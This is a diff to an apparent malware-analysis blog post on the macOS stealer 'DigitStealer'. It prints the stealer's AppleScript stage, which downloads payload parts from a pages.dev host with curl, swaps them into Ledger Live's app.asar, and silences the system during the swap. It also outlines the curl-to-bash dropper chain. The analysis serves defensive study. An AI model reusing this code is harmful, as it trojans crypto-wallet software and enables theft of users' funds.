@@ -176,7 +176,7 @@ The execution chain at this point in time is as follows:
 1. `Drag Into Terminal.msi` dragged into terminal
     - `curl` pulls down `dropper.sh` into memory and pipes it into `bash`
 2. `dropper.sh`, from memory, pipes a base64 and gzip'd payload into `base64 -d`, `gunzip`, then into `bash`
-3. `curl` pulls down applescript and pipes it into `osascript`
+3. `curl` pulls down applescript and pipes it into `osascript` for execution
 
 So far, so good. Let's move on to the AppleScript payload. 
 
@@ -184,7 +184,7 @@ So far, so good. Let's move on to the AppleScript payload.
 
 ### The AppleScript
 
-This is the payload that pulls down three separate files then concatenates them into `app.asar`, which is used to replace a file within a legitimate Ledger Live install on a target host. 
+This is the payload that pulls down three separate files then concatenates them into `app.asar`, which is used to replace a file within a legitimate Ledger Live crypto wallet install on a target host. 
 
 The AppleScript used in DigitStealer:
 
@@ -233,6 +233,74 @@ do shell script "osascript -e 'set volume without output muted'"
 {: file="AppleScript" .nolineno }
 {% endraw %}
 
+Let's break this down a bit. 
+
+In this first section we have our initial variable declarations. The last variable in the list, `kDomain` is a concatenation of `kDomainPrefix` (`67e5143a9ca7d2240c137ef80f2641d6`), a period, and `kDomainSuffix` (`pages.dev`) to create `67e5143a9ca7d2240c137ef80f2641d6.pages[.]dev`, our primary remote payload host in this stage of the execution.
+
+Other variables here are used to determine paths used by the AppleScript, or the naming convention of files.
+
+{% raw %}
+```applescript
+set kDomainPrefix to "67e5143a9ca7d2240c137ef80f2641d6"
+set kDomainSuffix to "pages.dev"
+set kTotalParts to 3
+set kPartBaseName to "app.asar.zip.part"
+set kPartExtension to ".aspx"
+
+set kDownloadFolder to "/tmp/downloaded_parts"
+set kMergedZip to "/tmp/app.asar.zip"
+set kSourcePath to "/tmp/app.asar"
+set kDestPath to "/Applications/Ledger Live.app/Contents/Resources/"
+
+set kDomain to kDomainPrefix & "." & kDomainSuffix
+```
+{: file="AppleScript" .nolineno }
+{% endraw %}
+
+This next section starts off by setting the host's volume to mute. My assumption is that this is simply to avoid any system sounds that may be triggered by the following activity. Next we create our download folder and make sure we dont already have a `.zip` in place named `/tmp/app.asar.zip` by running a preliminary `rm -rf`. This is generally good practice for any payloads you may want to run more than once. 
+
+Next we have the AppleScript version of a `for` loop. `repeat with i from 1 to kTotalParts` simply means repeat the following code 3 times and iterate the `i` variable from 1 to 3 as each loop runs. We start by setting the URL for part 1 (note the `i` in the concatenated file path), then we set the name of the output file. then run curl to download the file from the URL we just created. Then we use `cat` to read out and append the data directly to the `kMergedZip` file. It then repeats this for parts 2 and 3. Once all 3 parts are appended, this will be a valid `.zip` file.
+
+{% raw %}
+```applescript
+do shell script "osascript -e 'set volume with output muted'"
+
+do shell script "mkdir -p " & quoted form of kDownloadFolder
+do shell script "rm -f " & quoted form of kMergedZip
+
+repeat with i from 1 to kTotalParts
+    set partUrl to "https://" & kDomain & "/" & kPartBaseName & i & kPartExtension
+    set partFile to kDownloadFolder & "/part" & i & kPartExtension
+
+    do shell script "curl --max-time 3600 --retry 10 --retry-delay 5 --retry-max-time 3600 -f -C - -o " & quoted form of partFile & " " & quoted form of partUrl
+    do shell script "cat " & quoted form of partFile & " >> " & quoted form of kMergedZip
+end repeat
+```
+{: file="AppleScript" .nolineno }
+{% endraw %}
+
+The final few lines of the Apple Script start off by unzipping the newly created zip file into `/tmp` then killing any currently running Ledger Live processes. Once killed, it tells Finder to take the `/tmp/app.asar` file that was just unzipped and copy it into `/Applications/Ledger Live.app/Contents/Resources/`. Since `with replacing` is set, it tells Finder to replace the original file in the destination with the new one. 
+
+The apple script then deletes the initial download folder and the zip, then unmutes the volume. 
+
+{% raw %}
+```applescript
+do shell script "cd /tmp && unzip -o " & quoted form of kMergedZip
+do shell script "killall 'Ledger Live' || true"
+
+tell application "Finder"
+    set sourceAlias to POSIX file kSourcePath as alias
+    set destAlias to POSIX file kDestPath as alias
+    duplicate sourceAlias to destAlias with replacing
+end tell
+
+do shell script "rm -rf " & quoted form of kDownloadFolder
+do shell script "rm -f " & quoted form of kMergedZip
+
+do shell script "osascript -e 'set volume without output muted'"
+```
+{: file="AppleScript" .nolineno }
+{% endraw %}
 ---
 
 ### Mimicking the AppleScript
